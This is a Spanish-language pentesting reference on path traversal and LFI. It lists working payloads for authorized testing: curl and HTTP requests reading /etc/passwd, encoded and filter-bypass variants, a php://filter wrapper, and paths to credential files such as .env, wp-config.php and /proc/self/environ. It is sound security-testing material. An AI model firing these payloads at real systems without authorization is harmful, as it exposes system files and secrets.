# 🗡️ Path Traversal y LFI: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 📚 Banco ampliado de payloads

[Abrir el catálogo por técnica y los diccionarios de PayloadsAllTheThings](Catalogo_PATT.md). Los bloques de esta guía explican las pruebas iniciales; el catálogo reúne variantes adicionales por motor, parser y contexto.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Traversal mínimo con archivo canary

```text
../canary-{NONCE}.txt
../../canary-{NONCE}.txt
..\canary-{NONCE}.txt
..\..\canary-{NONCE}.txt
```

**Cuándo usarlo:** Poner el archivo marcador en un directorio propio fuera de la raíz permitida; la profundidad depende del despliegue.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/file-path-traversal).


### Lectura clásica de /etc/passwd en Linux

```http
GET /download?file=../../../../etc/passwd HTTP/1.1
Host: {ORIGEN}

# Variantes del valor de file: ../etc/passwd | /etc/passwd
```

**Cuándo usarlo:** Ajustar la profundidad al directorio base. Una respuesta con líneas como root:x:0:0 confirma lectura; conservar solo las líneas necesarias para evidenciarla.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/file-path-traversal).


### Archivos convencionales para lectura acotada

```text
/etc/hosts
/etc/hostname
/proc/version
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
```

**Cuándo usarlo:** Estos nombres ayudan a identificar sistema; usar un canary propio cuando sea posible y nunca conservar secretos.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md).


### Rutas comunes de configuración Linux y aplicaciones

```text
/etc/passwd
/etc/hosts
/proc/self/cmdline
/proc/self/environ
/var/www/html/.env
/var/www/html/config.php
/var/www/html/wp-config.php
/etc/nginx/nginx.conf
```

**Cuándo usarlo:** Las rutas pueden contener secretos: leer solo lo necesario para una prueba autorizada y redactar la evidencia.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md).


### Rutas comunes en Windows e IIS

```text
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
```

**Cuándo usarlo:** Su existencia depende del despliegue; preferir canary propio y evitar extraer credenciales.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md).


## 🧭 Payloads por contexto

### Solicitud literal y codificada hacia /etc/passwd

```bash
curl --path-as-is 'https://{ORIGEN}/download?file=../../../../etc/passwd'
curl --path-as-is 'https://{ORIGEN}/download?file=..%2f..%2f..%2f..%2fetc%2fpasswd'
curl --path-as-is 'https://{ORIGEN}/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd'
```

**Cuándo usarlo:** Probar cada URL por separado: la segunda requiere decodificación URL y la tercera, doble decodificación. Cotejar con un archivo de control y registrar la request que realmente salió del cliente.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md).


### Codificación y normalización

```text
..%2f..%2fcanary-{NONCE}.txt
%2e%2e/%2e%2e/canary-{NONCE}.txt
..%252f..%252fcanary-{NONCE}.txt
....//....//canary-{NONCE}.txt
..%5c..%5ccanary-{NONCE}.txt
```

**Cuándo usarlo:** Cada línea presupone un orden de decodificación distinto; comparar URL enviada y ruta efectiva.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md).


## 🔥 Payloads avanzados

### Prefijo obligatorio y wrapper PHP

```text
/var/www/html/../../../canary-{NONCE}.txt
..;/..;/canary-{NONCE}.txt
php://filter/convert.base64-encode/resource={ARCHIVO_PROPIO}
```

**Cuándo usarlo:** El wrapper requiere PHP y un include compatible; base64 de un canary propio evita guardar datos privados.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md).


## 🔬 Pruebas guiadas por escenario

### 1. Traversal relativo

**Objetivo:** Leer un marcador propio situado fuera del directorio servido.

```bash
curl --path-as-is "https://{ORIGEN}/download?file=../../marcador-{NONCE}.txt"
```

**Interpretación:** Solo confirma traversal si el contenido único del archivo aparece. `--path-as-is` evita normalización del cliente.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/file-path-traversal).

### 2. Separadores codificados

**Objetivo:** Comprobar si un decoder posterior crea `../`.

```text
..%2f..%2fmarcador-{NONCE}.txt
```

**Interpretación:** Comparar con el marcador literal y con URL de control; dependerá del orden de decodificación.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal).

### 3. Doble codificación

**Objetivo:** Detectar dos capas de URL decoding.

```text
..%252f..%252fmarcador-{NONCE}.txt
```

**Interpretación:** Solo funciona si una capa decodifica `%25` y otra `%2f`; no asumirlo por un 200.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/file-path-traversal).

### 4. Filtro no recursivo

**Objetivo:** Comprobar si eliminar `../` una vez deja un nuevo segmento.

```text
....//....//marcador-{NONCE}.txt
```

**Interpretación:** Debe leerse el canary externo; un error con ruta normalizada ayuda a entender el filtro.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal).

### 5. Ruta absoluta

**Objetivo:** Verificar si el prefijo base se ignora.

```text
/{RUTA_ABSOLUTA_CANARY_PROPIO}/marcador-{NONCE}.txt
```

**Interpretación:** Usar primero un archivo propio; en un laboratorio Linux, `/etc/passwd` sirve como referencia de lectura absoluta si está dentro del alcance autorizado.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/file-path-traversal).

### 6. Windows con barra inversa

**Objetivo:** Probar normalización en un servidor Windows de laboratorio.

```text
..\..\marcador-{NONCE}.txt
```

**Interpretación:** En Linux puede ser literal; verificar tecnología antes de interpretar.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal).

### 7. Punto y coma en proxy Java

**Objetivo:** Comprobar parsing distinto entre proxy y contenedor.

```text
..;/..;/marcador-{NONCE}.txt
```

**Interpretación:** Requiere stack compatible; registrar ruta vista por frontend y backend si hay logs autorizados.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal).

### 8. Byte nulo histórico

**Objetivo:** Verificar solo en laboratorio legacy con archivo propio.

```text
../../marcador-{NONCE}.txt%00.jpg
```

**Interpretación:** La mayoría de stacks modernos rechaza `%00`; una respuesta 200 no prueba truncamiento.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/file-path-traversal).

### 9. Puntos codificados

**Objetivo:** Probar si el servidor decodifica los puntos antes de validar segmentos.

```text
%2e%2e/%2e%2e/marcador-{NONCE}.txt
```

**Interpretación:** Requiere canary externo propio. Una ruta aceptada que devuelve 404 no prueba lectura.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal).

### 10. Barra inversa codificada

**Objetivo:** Comprobar normalización de separador Windows.

```text
..%5c..%5cmarcador-{NONCE}.txt
```

**Interpretación:** Solo relevante en stacks que interpretan barra inversa como separador después de decodificar.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
